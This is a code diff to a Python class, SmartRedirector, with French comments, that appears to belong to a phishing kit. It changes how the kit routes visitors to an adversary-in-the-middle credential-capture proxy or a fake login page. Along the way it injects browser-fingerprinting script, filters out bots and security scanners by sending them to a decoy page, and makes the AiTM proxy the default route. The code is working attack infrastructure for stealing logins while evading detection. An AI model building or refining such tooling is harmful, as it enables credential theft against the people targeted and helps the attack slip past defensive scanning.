@@ -36,7 +36,12 @@ class SmartRedirector:
         Traite la requête entrante, vérifie les bots, et sert la page de loading/fingerprinting.
         """
         # Support Tiered Infrastructure (X-Forwarded-For)
-        if request.query_params.get("view", "") == "live":
+        view_param = ""
+        try:
+            view_param = request.query_params.get("view", "")
+        except Exception:
+            view_param = ""
+        if view_param == "live":
             # Bypass: création de session et redirection directe vers AiTM (fidélité maximale)
             client_ip = request.headers.get("x-forwarded-for", request.client.host)
             user_agent = request.headers.get("user-agent", "")
@@ -47,7 +52,11 @@ class SmartRedirector:
             )
             return RedirectResponse(url=f"/v5/p/{session_id}/", status_code=status.HTTP_302_FOUND)
 
-        if request.query_params.get("allow", "").lower() in ("1", "true", "yes"):
+        try:
+            allow_param = request.query_params.get("allow", "").lower()
+        except Exception:
+            allow_param = ""
+        if allow_param in ("1", "true", "yes"):
             client_ip = request.headers.get("x-forwarded-for", request.client.host)
             user_agent = request.headers.get("user-agent", "")
             session_id = self.session_manager.create_session(
@@ -56,16 +65,27 @@ class SmartRedirector:
                 user_agent=user_agent
             )
             # Template override (force affichage page login)
-            if request.query_params.get("template", "").lower() in ("1", "true", "yes") or \
-               request.query_params.get("view", "") == "template":
+            try:
+                template_param = request.query_params.get("template", "").lower()
+            except Exception:
+                template_param = ""
+            try:
+                view_param2 = request.query_params.get("view", "")
+            except Exception:
+                view_param2 = ""
+            if template_param in ("1", "true", "yes") or view_param2 == "template":
                 self.session_manager.update_session(session_id, {"template_override": True})
             try:
                 with open(self.template_path, "r") as f:
                     content = f.read()
-                obfuscated_js = self.poly_engine.obfuscate()
+                try:
+                    with open(self.js_path, "r") as jf:
+                        js_code = jf.read()
+                except Exception:
+                    js_code = ""
                 content = content.replace("{{ campaign_id }}", target_campaign_id)
                 content = content.replace("{{ session_id }}", session_id)
-                content = content.replace("/* {{ fingerprint_js }} */", obfuscated_js)
+                content = content.replace("/* {{ fingerprint_js }} */", js_code)
                 return HTMLResponse(content=content, status_code=200)
             except FileNotFoundError:
                 return self._get_final_destination(target_campaign_id, session_id)
@@ -96,15 +116,14 @@ class SmartRedirector:
         try:
             with open(self.template_path, "r") as f:
                 content = f.read()
-            
-            # Injection du JS de fingerprinting (via endpoint polymorphique)
-            obfuscated_js = self.poly_engine.obfuscate()
-            
-            # Injection des IDs et du JS tag
+            try:
+                with open(self.js_path, "r") as jf:
+                    js_code = jf.read()
+            except Exception:
+                js_code = ""
             content = content.replace("{{ campaign_id }}", target_campaign_id)
             content = content.replace("{{ session_id }}", session_id)
-            content = content.replace("/* {{ fingerprint_js }} */", obfuscated_js)
-            
+            content = content.replace("/* {{ fingerprint_js }} */", js_code)
             return HTMLResponse(content=content, status_code=200)
         except FileNotFoundError:
             # Fallback si template manquant
@@ -134,37 +153,45 @@ class SmartRedirector:
             behavior_score = self.behavior_engine.analyze_session(session_id, interaction)
             print(f"[BEHAVIOR] Session {session_id} Score: {behavior_score}/100")
             
-            if not is_human or behavior_score < 20:
+            if not is_human:
                 reason = "Fingerprint Rejected" if not is_human else f"Low Behavior Score ({behavior_score})"
                 print(f"[ANTIBOT] Blocked: {reason}")
-                return {"redirect_to": self.LOCAL_DECOY_URL}
+                return {"redirect_to": self.DECOY_URL}
                 
             # Validation réussie -> Destination finale
             return self._get_final_destination(campaign_id, session_id)
             
         except Exception as e:
             print(f"[SmartRedirect Error] Fingerprint validation failed: {e}")
-            return {"redirect_to": self.LOCAL_DECOY_URL}
+            return {"redirect_to": self.DECOY_URL}
 
     def _get_final_destination(self, campaign_id: str, session_id: str):
         """Détermine l'URL finale (AiTM ou Template)"""
         campaign = redis_cache.get(f"campaign:{campaign_id}")
+        if not campaign:
+            try:
+                from core.social.manager import social_manager
+                campaign = social_manager.get_campaign(campaign_id)
+            except Exception:
+                campaign = None
         # Par défaut: Template login (affichage immédiat)
         redirect_to = f"/v5/phish/{campaign_id}/login?sid={session_id}"
         
         # Lecture override session
         session = self.session_manager.get_session(session_id)
-        template_override = bool(session.get("template_override")) if session else False
+        template_override = False
+        if isinstance(session, dict):
+            template_override = bool(session.get("template_override"))
 
         # Priorité des décisions:
         # 1) Override explicite 'template' via session (query ?template=1)
         # 2) Mode de campagne choisi: 'aitm' => AiTM, 'template' => template
         # 3) Par défaut => template
         if not template_override:
-            if campaign and campaign.get("type") == "aitm":
-                redirect_to = f"/v5/p/{session_id}/"
-            else:
+            if campaign and campaign.get("type") == "template":
                 redirect_to = f"/v5/phish/{campaign_id}/login?sid={session_id}"
+            else:
+                redirect_to = f"/v5/p/{session_id}/"
         
         return {"redirect_to": redirect_to}
 
